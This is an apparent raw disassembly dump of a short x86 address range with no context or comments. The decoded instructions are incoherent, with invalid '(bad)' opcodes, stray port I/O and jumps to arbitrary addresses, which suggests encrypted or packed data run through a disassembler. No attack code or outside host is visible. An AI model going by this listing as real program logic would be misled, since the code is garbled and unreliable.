  42446d:	stc    
  42446e:	cmp    dh,bh
  424470:	pop    ecx
  424471:	inc    ecx
  424472:	inc    ebp
  424473:	cld    
  424474:	sti    
  424475:	data16 aad 0x76
  424478:	xor    DWORD PTR [esi-0x1a69ad7],esp
  42447e:	and    al,0x84
  424480:	push   cs
  424481:	punpckhwd mm6,QWORD PTR [esi]
  424484:	jae    0x42443e
  424486:	js     0x424414
  424488:	xor    al,0x81
  42448a:	enter  0x2067,0xc2
  42448e:	loop   0x4244a9
  424490:	imul   esi,DWORD PTR [ecx-0x2d],0x7a
  424494:	sbb    esp,eax
  424496:	pop    es
  424497:	cmp    al,0x51
  424499:	bound  ebx,QWORD PTR [edi+ebx*8-0x5]
  42449d:	mov    al,ds:0x55d1dc94
  4244a2:	pop    esp
  4244a3:	fs xchg edi,eax
  4244a5:	(bad)  
  4244a6:	icebp  
  4244a7:	sbb    al,0x1c
  4244a9:	out    0x98,eax
  4244ab:	jmp    0x7eac83a8
  4244b0:	add    al,0x4e
  4244b2:	retf   0x5194
  4244b5:	repnz loopne 0x4244df
  4244b8:	or     DWORD PTR [ebx-0x1e],ebx
  4244bb:	fidiv  WORD PTR [ecx-0x2e0bf573]
  4244c1:	int3   
  4244c2:	popf   
  4244c3:	mov    cl,0x72
  4244c5:	pavgb  mm3,QWORD PTR [ecx+0x2ded5aff]
  4244cc:	je     0x424518
  4244ce:	mov    bl,0xee
  4244d0:	dec    ebx
  4244d1:	push   es
  4244d2:	xchg   DWORD PTR [edi-0x630708bc],ebp
  4244d8:	rcl    DWORD PTR [edx+0x4c13fcc2],0xdd
  4244df:	xchg   edx,eax
  4244e0:	inc    esi
  4244e1:	gs adc eax,0xc8284eef
  4244e7:	pop    es
  4244e8:	jg     0x424496
  4244ea:	xor    BYTE PTR [esi],bl
  4244ec:	dec    eax
  4244ed:	(bad)  [ebp+0x7f321d7a]
  4244f3:	push   ss
  4244f4:	out    dx,eax
  4244f5:	push   ecx
  4244f6:	shr    DWORD PTR [edx+0x770531b9],0x7d
  4244fd:	push   0x95ae08c2
  424502:	push   edx
  424503:	aad    0x51
  424505:	adc    cl,BYTE PTR [edi-0x68]
  424508:	imul   ecx,esi,0xfffffff3
  42450b:	(bad)  
  42450c:	cmp    BYTE PTR ds:0xa297,ch
	...
  424572:	add    BYTE PTR [eax],al
  424574:	loopne 0x4245e5
  424576:	xchg   esi,eax
  424577:	inc    edx
  424578:	lahf   
  424579:	sti    
  42457a:	hlt    
  42457b:	out    dx,eax
  42457c:	dec    eax
  42457d:	rol    DWORD PTR [esp+ebx*4+0x76],1
  424581:	pop    edx
  424582:	and    BYTE PTR [ecx+0x18398],dl
  424588:	add    al,0x1
  42458a:	add    BYTE PTR [eax],al
  42458c:	mov    dh,0x22
  42458e:	mov    ds:0xd8f077d6,eax
  424593:	int    0x49
  424595:	nop
  424596:	aas    
  424597:	in     eax,dx
  424598:	fs jl  0x42452d
  42459b:	pop    esi
  42459c:	ror    al,0x8f
  42459f:	and    DWORD PTR [eax-0x3d],esp
  4245a2:	and    esp,DWORD PTR [esi+0x20]
  4245a5:	aas    
  4245a6:	push   0x23
  4245a8:	fild   DWORD PTR [esi+0x159931f5]
  4245ae:	fdivr  DWORD PTR [ebx+0x22b1c3d2]
  4245b4:	jne    0x4245a0
  4245b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4245b7:	mov    dl,0x10
  4245b9:	(bad)  
  4245bb:	lahf   
  4245bc:	mov    esp,0x223e07fa
  4245c1:	mov    al,BYTE PTR [edx-0x6c]
  4245c4:	out    dx,al
  4245c5:	mov    BYTE PTR [esp+ecx*1],ch
  4245c8:	fadd   QWORD PTR [ebx-0x3d]
  4245cb:	add    DWORD PTR ds:0xc8508bf5,0xffffff84
  4245d2:	sub    BYTE PTR [esi],ch
  4245d4:	lea    eax,[ebx]
  4245d6:	mov    al,BYTE PTR [edx+edx*2]
  4245d9:	sbb    eax,0xd0de8690
  4245de:	(bad)  
  4245df:	mov    eax,ds:0x39619ff3
  4245e4:	mov    ecx,0xa3471c25
  4245e9:	jle    0x42463d
  4245eb:	loop   0x42461f
  4245ed:	jnp    0x4245be
  4245ef:	inc    ebp
  4245f0:	and    eax,0xa0e17cdb
  4245f5:	sbb    al,0x33
  4245f7:	div    BYTE PTR [ecx+0x7a]
  4245fa:	(bad)  
  4245fb:	sbb    al,bl
  4245fd:	xchg   DWORD PTR [ebp+0xb],eax
  424600:	sbb    ecx,DWORD PTR [ebp+0x31]
  424603:	mov    ebx,0x6c49964d
  424608:	xor    al,0x76
  42460a:	rcr    ebp,1
  42460c:	sbb    al,0x51
  42460e:	mov    edi,0x5f9c5e76
  424613:	xchg   esp,eax
  424614:	mov    bl,0xd5
  424616:	jb     0x4245c6
  424618:	sub    DWORD PTR [ecx+0x7d],edx
  42461b:	mov    dh,0xfd
  42461d:	retf   0x2b
  424620:	add    edi,DWORD PTR [ecx-0x1787233c]
  424626:	adc    al,0xca
  424628:	add    dh,BYTE PTR [esp+ebx*2+0x558da5f8]
  42462f:	leave  
  424630:	cwde   
  424631:	push   es
  424632:	pop    edi
  424633:	(bad)
  424636:	out    0x6a,al
  424638:	(bad)  
  42463a:	cmp    al,bh
  42463c:	(bad)  [ebx-0x5c3ddf]
  424642:	mov    al,ds:0xf841c66a
  424647:	adc    al,0xeb
  424649:	mov    dl,0xd3
  42464b:	in     eax,dx
  42464c:	xor    bl,BYTE PTR [ecx+0x681c8ea]
  424652:	pop    ss
  424653:	icebp  
  424654:	arpl   WORD PTR [edx+0x69e60cc0],ax
  42465a:	mov    bl,0xef
  42465c:	cmp    edx,DWORD PTR [esi+0x9]
  42465f:	test   cl,ah
  424661:	sahf   
  424662:	sub    esp,DWORD PTR [ecx+0x7f]
  424665:	test   DWORD PTR [eax],edi
  424667:	sub    BYTE PTR ds:0x8e1b4d44,ah
  42466d:	ins    BYTE PTR es:[edi],dx
  42466e:	xchg   esi,eax
  42466f:	mov    WORD PTR [edx+0x18],es
  424672:	add    BYTE PTR [esi+0x3b],al
  424675:	(bad)  [ecx+0x7d40428c]
  42467b:	jg     0x42460d
  42467d:	std    
  42467e:	sbb    BYTE PTR [esi],dh
  424680:	push   cs
  424681:	fst    st(4)
  424683:	lods   eax,DWORD PTR ds:[esi]
  424684:	sar    cx,1
  424687:	std    
  424688:	mov    BYTE PTR [edi],bl
  42468a:	das    
  42468b:	call   0x0:0xc1e4dcf5
	...
  4246f2:	add    BYTE PTR [eax],al
  4246f4:	mov    esp,0xfefffc92
  4246f9:	(bad)  
  4246fa:	mov    edi,0xb298dbd3
  4246ff:	mov    BYTE PTR [ebx+eax*1-0x7b63197c],cl
  424706:	add    DWORD PTR [eax],eax
  424708:	add    al,0x1
  42470a:	add    BYTE PTR [eax],al
  42470c:	push   esp
  42470d:	rcl    BYTE PTR [ecx+0x3f5d1194],cl
  424713:	jae    0x424770
  424715:	or     DWORD PTR [esi+0x78d13b28],ebp
  42471b:	sar    BYTE PTR [ebp-0x6c],cl
  42471e:	xchg   esi,eax
  42471f:	std    
  424720:	dec    eax
  424721:	sub    edx,ecx
  424723:	dec    edx
  424724:	and    eax,0xe1c4742d
  424729:	sbb    BYTE PTR [ebx-0x72],bh
  42472c:	ins    BYTE PTR es:[edi],dx
  42472d:	mov    esi,0xcab10a75
  424732:	or     DWORD PTR [ebp-0x9],ecx
  424735:	mov    al,0x18
  424737:	dec    esi
  424738:	xchg   BYTE PTR [ebp-0x48],bh
  42473b:	adc    esi,DWORD PTR [edx]
  42473d:	xchg   ebp,eax
  42473e:	mov    es,WORD PTR [ebx*8-0x69fbaa27]
  424745:	mov    al,ds:0x73b923ce
  42474a:	pop    ds
  42474b:	add    ebp,0xffffffa9
  42474e:	mov    esi,esi
  424750:	nop
  424751:	push   ds
  424752:	adc    ebx,edx
  424754:	add    al,0x72
  424756:	jmp    0x42475d
  424758:	in     al,dx
  424759:	imul   ecx,DWORD PTR [edi+0x13],0xb89f1ac9
  424760:	mul    BYTE PTR [ebp+0x5387ae4e]
  424766:	mov    esi,0x158e703c
  42476b:	int    0x3f
  42476d:	retf   
  42476e:	cmp    al,0x82
  424770:	push   es
  424771:	pop    esi
  424772:	es lahf 
  424774:	retf   0x2e0
  424777:	or     eax,0x5a0f27a9
  42477c:	push   ebx
  42477d:	inc    esp
  42477e:	out    dx,al
  42477f:	xchg   edx,eax
  424780:	stos   BYTE PTR es:[edi],al
  424781:	jae    0x4247f7
  424783:	jl     0x4247c1
  424785:	sub    eax,0xc840c072
  42478a:	neg    BYTE PTR [edi+0x2]
  42478d:	dec    edi
  42478e:	and    ecx,DWORD PTR [eax-0x7c]
  424791:	mov    dh,0x8f
  424793:	xor    DWORD PTR [esi+ecx*2],eax
  424796:	pusha  
  424797:	sub    al,BYTE PTR [esi+eiz*4]
  42479a:	sub    DWORD PTR [ebp+esi*1-0x3e],ecx
  42479e:	mov    eax,0xd3891684
  4247a3:	imul   ebx,DWORD PTR [ebp-0xa],0x6f93ff4f
  4247aa:	push   ecx
  4247ab:	aaa    
  4247ac:	mov    ebx,ecx
  4247ae:	(bad)
  4247b1:	jns    0x4247a6
  4247b3:	jb     0x4247c3
  4247b5:	inc    ebx
  4247b6:	xor    eax,0xc53ccc89
  4247bb:	dec    ebx
  4247bc:	add    DWORD PTR [ebx-0x6859ecb5],esp
  4247c2:	cmp    DWORD PTR [eax+edi*1-0x63e4b1d],esp
  4247c9:	inc    edx
  4247ca:	jno    0x42475b
  4247cc:	jns    0x42482b
  4247ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4247cf:	(bad)  
  4247d1:	and    BYTE PTR [ebx+edx*4-0x15],0x6c
  4247d6:	int3   
  4247d7:	jl     0x424771
  4247d9:	adc    BYTE PTR [edx+0x72a72dca],dh
  4247df:	dec    ecx
  4247e0:	push   ebp
  4247e1:	call   DWORD PTR [edi-0x42]
  4247e4:	jp     0x424864
  4247e6:	or     BYTE PTR [eax+0x11],al
  4247e9:	pop    esi
  4247ea:	(bad)  [edx*2-0x681d9e1f]
  4247f1:	add    BYTE PTR [ecx],dl
  4247f3:	sbb    DWORD PTR [eax],esp
  4247f5:	retf   0x4eac
  4247f8:	cmp    eax,0xb9d84549
  4247fd:	jo     0x4247c5
  4247ff:	fwait
  424800:	stos   BYTE PTR es:[edi],al
  424801:	cmp    BYTE PTR [ecx],cl
  424803:	loop   0x424809
  424805:	shl    BYTE PTR [ebx-0x32253c],0x8e
  42480c:	cmc    
  42480d:	cld    
  42480e:	pop    eax
  42480f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  424874:	and    bl,BYTE PTR [eax-0x7c]
  424877:	out    dx,eax
  424878:	(bad)  
  424879:	jmp    FWORD PTR [ebx-0x23]
  42487c:	lock test BYTE PTR [ebx],dl
  42487f:	xchg   esp,eax
  424880:	nop
  424881:	fxch   st(4)
  424883:	pop    esp
  424884:	mov    al,ds:0x4000185
  424889:	add    DWORD PTR [eax],eax
  42488b:	add    cl,ah
  42488d:	out    dx,al
  42488e:	cwde   
  42488f:	mov    edi,esi
  424891:	jle    0x424821
  424893:	jmp    0x48f17e6f
  424898:	ins    BYTE PTR es:[edi],dx
  424899:	jnp    0x4248e9
  42489b:	repz xchg esi,eax
  42489d:	pop    esp
  42489e:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4248a0:	mov    cl,0xf0
  4248a2:	imul   esi,DWORD PTR [eax-0x9a8f7f4],0x16d292c8
  4248ac:	lods   eax,DWORD PTR ds:[esi]
  4248ad:	into   
  4248ae:	adc    esi,eax
  4248b0:	into   
  4248b1:	xchg   ebp,eax
  4248b2:	ds sahf 
  4248b4:	push   cs
  4248b5:	arpl   WORD PTR ds:0x9792b93b,dx
  4248bb:	cdq    
  4248bc:	inc    eax
  4248bd:	sub    DWORD PTR [ebx],ebx
  4248bf:	cs jnp 0x4248b1
  4248c2:	mov    dh,BYTE PTR [esp+ebx*2+0x70]
  4248c6:	xlat   BYTE PTR ds:[ebx]
  4248c7:	pop    esi
  4248c8:	add    eax,DWORD PTR [ecx]
  4248ca:	xchg   ebp,eax
  4248cb:	je     0x42487f
  4248cd:	sub    ecx,DWORD PTR [eax-0x6df6c9f4]
  4248d3:	sbb    BYTE PTR [ecx-0x64fcd298],dl
  4248d9:	mul    DWORD PTR [ebx-0x5aefb561]
  4248df:	iret   
  4248e0:	and    DWORD PTR [ebx+0x1f],0xffffffc7
  4248e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4248e5:	pop    eax
  4248e6:	mov    eax,0xb03a6e49
  4248eb:	out    0x2e,eax
  4248ed:	pop    ds
  4248ee:	or     dl,BYTE PTR [ecx-0x2d0b351e]
  4248f4:	jp     0x4248c0
  4248f6:	aaa    
  4248f7:	cmp    DWORD PTR [ebx-0x24],ecx
  4248fa:	push   es
  4248fb:	pop    esp
  4248fc:	mov    DWORD PTR [ebx*4-0x37a97e60],edi
  424903:	dec    edx
  424904:	inc    ebx
  424905:	mov    ch,BYTE PTR [edx+0x40]
  424908:	int    0x5
  42490a:	inc    esi
  42490b:	push   0x41
  42490d:	dec    ebx
  42490e:	retw   
  424910:	inc    edi
  424911:	sbb    edi,esi
  424913:	ja     0x424925
  424915:	push   ebp
  424916:	stc    
  424917:	adc    edx,DWORD PTR [ebp-0x68]
  42491a:	test   al,0x6f
  42491c:	push   0x52a505f3
  424921:	mov    eax,ds:0x88f9ec2f
  424926:	enter  0x1da8,0xa6
  42492a:	xlat   BYTE PTR ds:[ebx]
  42492b:	xlat   BYTE PTR ds:[ebx]
  42492c:	cmp    eax,0x5582f820
  424931:	test   al,0x83
  424933:	inc    esp
  424934:	dec    esi
  424935:	fadd   QWORD PTR [eax+eiz*1-0x3fc1c75d]
  42493c:	lds    ebx,FWORD PTR [ecx]
  42493e:	ficomp DWORD PTR [ecx]
  424940:	lods   eax,DWORD PTR ds:[esi]
  424941:	push   esi
  424942:	mov    esp,0x41b16ad8
  424947:	add    BYTE PTR [ebp+ebx*1+0xf8efd20],dl
  42494e:	aaa    
  42494f:	jge    0x42497a
  424951:	or     ch,BYTE PTR [ecx+0x5babea31]
  424957:	fild   DWORD PTR [edx+0x15d01de8]
  42495d:	or     esp,DWORD PTR fs:[ebx+0x6a7cb8a7]
  424964:	xchg   esp,eax
  424965:	mov    dh,0x48
  424967:	test   DWORD PTR [edx-0x9],esi
  42496a:	xchg   ebp,eax
  42496b:	pop    ds
  42496c:	jno    0x424984
  42496e:	gs mov dl,0xb9
  424971:	mov    bl,0xe7
  424973:	ror    BYTE PTR [ebp+0x48],1
  424976:	sar    BYTE PTR [edx+eiz*8-0x44],0xee
  42497b:	jecxz  0x424902
  42497d:	push   0xffffffa9
  42497f:	ins    BYTE PTR es:[edi],dx
  424980:	shr    BYTE PTR [ecx-0x4f2c6c56],0xc8
  424987:	adc    bh,BYTE PTR [ebx]
  424989:	sbb    ch,BYTE PTR [ecx+0x56b8283c]
  42498f:	mov    bl,0x0
	...
  4249f1:	add    BYTE PTR [eax],al
  4249f3:	add    BYTE PTR [ebx+0x18],ch
  4249f6:	arpl   WORD PTR [edx+0x73],bp
  4249f9:	jnp    0x424a66
  4249fb:	sbb    DWORD PTR [eax-0x5c],ecx
  4249fe:	push   esi
  4249ff:	xor    bh,BYTE PTR [edi]
  424a01:	xor    esi,DWORD PTR [ebx+0x186a41b]
  424a07:	add    BYTE PTR [ecx+eax*1],al
  424a0a:	add    BYTE PTR [eax],al
  424a0c:	dec    esp
  424a0d:	mov    ah,dh
  424a0f:	or     al,0xe0
  424a11:	rol    BYTE PTR [ebp-0x187c0fc9],cl
  424a17:	sub    eax,0x9654ccd
  424a1c:	shl    BYTE PTR [ebp+0x1d41cedc],1
  424a22:	cmp    BYTE PTR [esi+0x62],dl
  424a25:	sbb    eax,ecx
  424a27:	test   eax,0x4f2e41c4
  424a2c:	dec    ebp
  424a2d:	mov    fs,ecx
  424a2f:	inc    edi
  424a30:	xor    BYTE PTR [eax],bh
  424a32:	(bad)  
  424a33:	leave  
  424a34:	sbb    eax,0x13993949
  424a39:	aad    0x5b
  424a3b:	je     0x424a94
  424a3d:	push   es
  424a3e:	mov    WORD PTR [ebx+0x6],?
  424a41:	cld    
  424a42:	hlt    
  424a43:	xchg   esp,eax
  424a44:	mov    bl,0xc1
  424a46:	stc    
  424a47:	daa    
  424a48:	mov    dl,0x15
  424a4a:	xchg   esi,eax
  424a4b:	int    0x2a
  424a4d:	clc    
  424a4e:	enter  0x902a,0xa6
  424a52:	push   es
  424a53:	inc    ecx
  424a54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424a55:	jl     0x424a68
  424a57:	outs   dx,BYTE PTR ds:[esi]
  424a58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424a59:	jecxz  0x424a23
  424a5b:	mov    ds:0x5268a382,al
  424a60:	dec    edi
  424a61:	fisub  WORD PTR [ecx]
  424a63:	adc    al,0xb5
  424a65:	dec    edi
  424a66:	mov    ds,WORD PTR [ebp-0x54]
  424a69:	shr    BYTE PTR [ebx],cl
  424a6b:	scas   eax,DWORD PTR es:[edi]
  424a6c:	(bad)  [ebx-0x42]
  424a6f:	fadd   st,st(5)
  424a71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424a72:	not    DWORD PTR [edx]
  424a74:	cmp    eax,0x6555515e
  424a79:	daa    
  424a7a:	inc    ebp
  424a7b:	xlat   BYTE PTR ds:[ebx]
  424a7c:	arpl   ax,cx
  424a7e:	or     al,0xe1
  424a80:	xchg   ebp,eax
  424a81:	rcr    edx,0x55
  424a84:	mov    ah,0xcf
  424a86:	sti    
  424a87:	pushf  
  424a88:	cmp    DWORD PTR [edi],edi
  424a8a:	adc    dl,dh
  424a8c:	(bad)  
  424a8d:	inc    ecx
  424a8e:	mov    ds:0x8f458656,eax
  424a93:	fcomp  DWORD PTR [edx]
  424a95:	test   al,0x51
  424a97:	mov    dh,0xfc
  424a99:	dec    ecx
  424a9a:	(bad)  
  424a9b:	sub    al,0xa9
  424a9d:	or     eax,0x94895af6
  424aa2:	pop    es
  424aa3:	and    BYTE PTR [ebx-0x6e39a63c],ch
  424aa9:	xchg   esi,eax
  424aaa:	fwait
  424aab:	out    0xd4,eax
  424aad:	jo     0x424af7
  424aaf:	enter  0x6d14,0x67
  424ab3:	ret    0x5702
  424ab6:	ret    
  424ab7:	or     edx,esi
  424ab9:	mov    al,ds:0xec53c14b
  424abe:	aas    
  424abf:	outs   dx,DWORD PTR ds:[esi]
  424ac0:	add    al,BYTE PTR [ebx]
  424ac2:	nop
  424ac3:	das    
  424ac4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424ac5:	or     DWORD PTR [ecx+0x4b],ecx
  424ac8:	add    DWORD PTR [edi+0x30],ebx
  424acb:	ins    DWORD PTR es:[edi],dx
  424acc:	test   al,0xd
  424ace:	inc    edi
  424acf:	repnz (bad) 
  424ad1:	jge    0x424acd
  424ad3:	inc    esi
  424ad4:	push   eax
  424ad5:	imul   ecx,DWORD PTR [ecx+0x5b],0x79
  424ad9:	sahf   
  424ada:	add    eax,DWORD PTR [ebp+0xf4bc5a5]
  424ae0:	xor    BYTE PTR [ebp+eax*2-0x2e],0xe4
  424ae5:	xchg   edx,eax
  424ae6:	inc    edi
  424ae7:	mov    dh,0x73
  424ae9:	fwait
  424aea:	leave  
  424aeb:	cdq    
  424aec:	shl    ecx,0xc7
  424aef:	les    ebp,FWORD PTR [ebx+0x6b]
  424af2:	bound  esi,QWORD PTR [eax-0x2a]
  424af5:	leave  
  424af6:	mov    edi,0x53c83d31
  424afb:	pop    ss
  424afc:	sub    DWORD PTR [edi+ecx*1+0x13],0x2f
  424b01:	aam    0xba
  424b03:	repz hlt 
  424b05:	rol    BYTE PTR [eax+0xa56e849],0xd4
  424b0c:	ja     0x424ac9
  424b0e:	aam    0xa0
	...
  424b74:	push   es
  424b75:	aas    
  424b76:	or     eax,0xb6bb3db9
  424b7b:	mov    edi,0xdc50081e
  424b80:	push   esp
  424b81:	xor    ecx,esi
  424b83:	mov    dl,0xa8
  424b85:	xchg   DWORD PTR [ecx],eax
  424b87:	add    BYTE PTR [ecx+eax*1],al
  424b8a:	add    BYTE PTR [eax],al
  424b8c:	sbb    esi,edx
  424b8e:	in     eax,dx
  424b8f:	jb     0x424b60
  424b91:	and    eax,0xf96bd5a
  424b96:	in     eax,dx
  424b97:	in     al,dx
  424b98:	or     DWORD PTR [edi+0x447776f],ebp
  424b9e:	jg     0x424b4b
  424ba0:	int    0x51
  424ba2:	xchg   edi,eax
  424ba3:	or     eax,0x39f75668
  424ba8:	dec    ebp
  424ba9:	dec    edi
  424baa:	clc    
  424bab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424bac:	dec    esi
  424bad:	or     BYTE PTR [edi-0x5a62be20],ah
  424bb3:	out    0x99,eax
  424bb5:	pusha  
  424bb6:	add    ch,cl
  424bb8:	jae    0x424b8e
  424bba:	(bad)  
  424bbc:	pop    edi
  424bbd:	mov    ebp,0x47469940
  424bc2:	push   ecx
  424bc3:	mov    cs,WORD PTR [edx-0x63]
  424bc6:	fsin   
  424bc8:	xchg   esi,eax
  424bc9:	ret    0xeb1e
  424bcc:	sbb    eax,0x2cc4e315
  424bd1:	xor    esp,DWORD PTR [edx-0x39]
  424bd4:	setno  BYTE PTR [edx-0xf]
  424bd8:	jne    0x424be9
  424bda:	xchg   ecx,eax
  424bdb:	xor    al,0x34
  424bdd:	cmp    al,0x91
  424bdf:	jl     0x424c3c
  424be1:	pop    ds
  424be2:	in     al,dx
  424be3:	jb     0x424b78
  424be5:	in     eax,0x59
  424be7:	imul   ebp,DWORD PTR [ebx-0x6f425000],0xf10ae991
  424bf1:	or     al,cl
  424bf3:	jecxz  0x424c43
  424bf5:	mov    edi,0xd2226b51
  424bfa:	dec    DWORD PTR [ecx-0x79]
  424bfd:	inc    edi
  424bfe:	rcl    DWORD PTR [esi-0x80],1
  424c01:	adc    DWORD PTR [ebp-0x3d0678cf],esi
  424c07:	outs   dx,BYTE PTR es:[esi]
  424c09:	dec    edi
  424c0a:	or     al,BYTE PTR [edi]
  424c0c:	sar    BYTE PTR fs:[ecx],1
  424c0f:	push   ss
  424c10:	sbb    dl,0xa8
  424c13:	sahf   
  424c14:	xchg   esp,eax
  424c15:	mov    bl,0xc4
  424c17:	lds    ebp,FWORD PTR [ecx-0x49]
  424c1a:	mov    ah,dh
  424c1c:	shl    bl,cl
  424c1e:	mov    ebx,0x50d08833
  424c23:	mov    WORD PTR [ecx-0x2b],gs
  424c26:	jb     0x424c62
  424c28:	clc    
  424c29:	pop    esi
  424c2a:	sbb    dh,BYTE PTR [edx]
  424c2c:	out    0xe0,eax
  424c2e:	cmp    edx,edi
  424c30:	pop    edx
  424c31:	stos   DWORD PTR es:[edi],eax
  424c32:	pop    esi
  424c33:	add    dl,bl
  424c35:	test   DWORD PTR ds:0xcc5c0a83,edx
  424c3b:	add    DWORD PTR [esi-0x4c],0xcc616c29
  424c42:	sbb    BYTE PTR [ecx],0xca
  424c45:	repz aaa 
  424c47:	(bad)  
  424c48:	fcom   QWORD PTR [edi-0x7e]
  424c4b:	sbb    dh,bl
  424c4d:	fmul   st,st(4)
  424c4f:	fisub  WORD PTR cs:[edi]
  424c52:	push   es
  424c53:	mov    ebp,0xc5487dd3
  424c58:	cmp    eax,0x9a3af0
  424c5d:	ins    DWORD PTR es:[edi],dx
  424c5e:	adc    al,0x65
  424c60:	or     DWORD PTR [eax],ebp
  424c62:	int    0xed
  424c64:	lahf   
  424c65:	fmul   QWORD PTR [ecx+eax*1+0x51]
  424c69:	xchg   BYTE PTR [ebp+edx*8-0x4ef882c6],dh
  424c70:	jecxz  0x424c0d
  424c72:	mov    eax,0x76c996bf
  424c77:	ins    BYTE PTR es:[edi],dx
  424c78:	xchg   esp,eax
  424c79:	dec    esi
  424c7a:	mov    ch,BYTE PTR [eax+0x28]
  424c7d:	mov    bh,0x4
  424c7f:	xor    BYTE PTR [edx-0x1b4e40f7],ah
  424c85:	ja     0x424cf0
  424c87:	xor    eax,DWORD PTR [ebx]
  424c89:	sbb    cl,BYTE PTR [esi]
  424c8b:	sub    DWORD PTR [edi+eiz*4-0x79],ebp
  424c8f:	dec    ebx
	...
  424cf4:	ins    BYTE PTR es:[edi],dx
  424cf5:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
  424cfc:	bound  ebx,QWORD PTR [ebx-0x6cb6ae58]
  424d02:	add    eax,0x188ac3a
  424d07:	add    BYTE PTR [ecx+eax*1],al
  424d0a:	add    BYTE PTR [eax],al
  424d0c:	test   dh,al
  424d0e:	adc    ebx,DWORD PTR [esi-0x64]
  424d11:	adc    ch,BYTE PTR [ebx]
  424d13:	and    DWORD PTR [ebp-0x2a6a4657],eax
  424d19:	inc    edi
  424d1a:	daa    
  424d1b:	test   ah,dl
  424d1d:	ror    DWORD PTR [edx+edi*8+0x6dd402fb],cl
  424d24:	or     BYTE PTR [esi-0x31],ch
  424d27:	or     edx,DWORD PTR [ecx-0x39]
  424d2a:	jmp    0x2901:0xf3410d43
  424d31:	push   ds
  424d32:	push   edx
  424d33:	mov    ds:0x275bb114,al
  424d38:	and    DWORD PTR [esi],edx
  424d3a:	sub    dl,ah
  424d3c:	hlt    
  424d3d:	mov    DWORD PTR ds:[ebp-0x2f2252cf],ecx
  424d44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424d45:	pop    edx
  424d46:	cmp    ch,BYTE PTR [ebx-0x70]
  424d49:	pop    ecx
  424d4a:	cmp    BYTE PTR [edx-0x1707b0dc],0xa4
  424d51:	sub    ecx,eax
  424d53:	pushf  
  424d54:	mov    cl,0x3f
  424d56:	rcl    DWORD PTR [ebx+0x66],1
  424d59:	sub    bh,BYTE PTR [ecx-0x6023dcee]
  424d5f:	xabort 0x8
  424d62:	es mov bl,0x7e
  424d65:	enter  0xd8e7,0xeb
  424d69:	nop
  424d6a:	xor    al,0x19
  424d6c:	inc    ebp
  424d6d:	cwde   
  424d6e:	mov    ds:0x5c52cb92,eax
  424d73:	jp     0x424d4c
  424d75:	xchg   ch,bh
  424d77:	xchg   BYTE PTR [esi+0x1db6d8b6],ah
  424d7d:	(bad)  
  424d7e:	scas   al,BYTE PTR es:[edi]
  424d7f:	sbb    al,0xa1
  424d81:	inc    ebx
  424d82:	jecxz  0x424de9
  424d84:	inc    edx
  424d85:	mov    esp,0xb290aeb9
  424d8a:	xchg   ebp,eax
  424d8b:	mov    esi,0x104084eb
  424d90:	stc    
  424d91:	xchg   edx,eax
  424d92:	inc    ecx
  424d93:	jnp    0x424d73
  424d95:	aaa    
  424d96:	xchg   DWORD PTR [esi-0x5],ebp
  424d99:	pop    ss
  424d9a:	sbb    eax,0x3a569583
  424d9f:	test   BYTE PTR [eax+0x25],al
  424da2:	pop    edx
  424da3:	in     eax,0x4
  424da5:	cmp    BYTE PTR [edx],dh
  424da7:	jp     0x424dad
  424da9:	pop    eax
  424daa:	and    esi,edx
  424dac:	lock retf 0xbcbf
  424db0:	or     eax,0xebcc55a6
  424db5:	inc    ecx
  424db6:	sbb    BYTE PTR [ebp+0x7c4e7a9c],dh
  424dbc:	rcl    DWORD PTR [ebp*4-0x44958615],cl
  424dc3:	mov    edi,0x7685a89b
  424dc8:	ins    DWORD PTR es:[edi],dx
  424dc9:	jae    0x424dca
  424dcb:	dec    eax
  424dcc:	outs   dx,BYTE PTR ds:[esi]
  424dcd:	mov    bh,0xcb
  424dcf:	fsubr  DWORD PTR [ebx+0x729eca72]
  424dd5:	mov    ebx,0xf6e3123b
  424dda:	test   BYTE PTR [ecx],al
  424ddc:	adc    edx,DWORD PTR [ebx-0x6d753ff6]
  424de2:	xchg   esi,eax
  424de3:	mov    ebp,DWORD PTR fs:[ecx+0x7cfc6048]
  424dea:	xor    eax,0x210bbec2
  424def:	mov    dh,0x86
  424df1:	and    al,0xea
  424df3:	and    al,0x29
  424df5:	cs (bad) 
  424df7:	push   ebp
  424df8:	cdq    
  424df9:	pop    edx
  424dfa:	jge    0x424de1
  424dfc:	iret   
  424dfd:	lds    edi,FWORD PTR [ebp-0x73]
  424e00:	xor    BYTE PTR [ebx],0x8d
  424e03:	retf   
  424e04:	mov    ebx,0x4b046dab
  424e09:	add    ch,BYTE PTR [edx-0x31]
  424e0c:	sbb    eax,0xaf1119
	...
  424e71:	add    BYTE PTR [eax],al
  424e73:	add    BYTE PTR ds:0xf361d20c,bh
  424e79:	(bad)  
  424e7a:	mov    edi,0x4bceee5c
  424e7f:	jns    0x424e68
  424e81:	cmp    BYTE PTR [ecx],bh
  424e83:	xchg   esp,eax
  424e84:	mov    al,0x89
  424e86:	add    DWORD PTR [eax],eax
  424e88:	add    al,0x1
  424e8a:	add    BYTE PTR [eax],al
  424e8c:	in     eax,dx
  424e8d:	popa   
  424e8e:	test   al,0x96
  424e90:	push   cs
  424e91:	nop
  424e92:	and    DWORD PTR [edx],edx
  424e94:	loope  0x424f0e
  424e96:	jae    0x424eee
  424e98:	inc    esp
  424e99:	call   0xc1459e27
  424e9e:	test   eax,0xfb9f7527
  424ea4:	cwde   
  424ea5:	push   esi
  424ea6:	adc    BYTE PTR [ebx],ah
  424ea8:	add    bh,bh
  424eaa:	call   FWORD PTR [ebp+edx*2-0x77]
  424eae:	and    al,0x23
  424eb0:	mov    edx,0x7ef285da
  424eb5:	mov    eax,DWORD PTR [edx-0x1aac1c39]
  424ebb:	or     BYTE PTR fs:[ebp+eax*1-0x2d],bh
  424ec0:	sub    edi,DWORD PTR [esp+edx*2-0x689d7b39]
